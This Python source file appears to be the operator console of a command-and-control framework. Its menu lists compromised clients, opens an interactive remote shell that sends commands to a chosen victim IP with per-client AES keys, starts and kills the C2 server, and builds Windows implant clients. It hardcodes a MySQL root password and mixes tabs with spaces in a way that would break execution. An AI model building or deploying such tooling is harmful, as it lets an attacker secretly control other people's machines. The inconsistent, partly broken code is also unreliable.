import functions
import MySQLdb
import os
import signal
from functions import *

def menu():
	print("[1] List connected clients")
	print("[2] List all clients")
	print("[3] Interact with a client")
	print("[4] Start the C2 server")
	print("[5] Kill the C2 server")
	print("[6] Build a generic Windows client")
	print("[7] Build a custom client")
	print("[8] Exit")

def id_to_ip(client_id):
# Translate an unique ID into the corresponding IP
        db = MySQLdb.connect("localhost","root","toor","clients")
        cursor = db.cursor()
	cursor.execute( """select lip from clients.clients where id = %s""",([client_id]))
	rows = cursor.fetchall()
	ip = str(rows)[:-5]
	ip = ip.replace("(('","")
	db.close
	return ip

def interact_sub_menu():
	client_id = raw_input("ID of the remote client to interact with : ")
	ip = id_to_ip(client_id)

	calc_aes_key(client_id)

	Exit = False
	print("Type 'Exit' to quit the remote shell.")
	while Exit == False:
		command_sub = raw_input(ip + " shell >> ")
		command_send = command_sub
		try:
			functions.send_cmd(command_send,ip)
		except:
			print("Debug me")

		if command_sub == "Exit":
			print(" ")
			Exit = True
		else:
			pass

loop =True

while loop:
	menu()
	choice = input("Choose option (1 to 8) : ")

	if choice == 1:
		os.system('clear')
		functions.who_is_alive_connected()
	elif choice == 2:
		os.system('clear')
                functions.who_is_alive()
	elif choice == 3:
		os.system('clear')
		who_is_alive()
                interact_sub_menu()
	elif choice == 4:
		os.system('clear')
		start_server()
	elif choice == 5:
		os.system('clear')
		kill_server()
	elif choice == 6:
		os.system('clear')
		generate_client()
	elif choice == 8:
                loop = False
	else:
		print("Wrong option selection.")
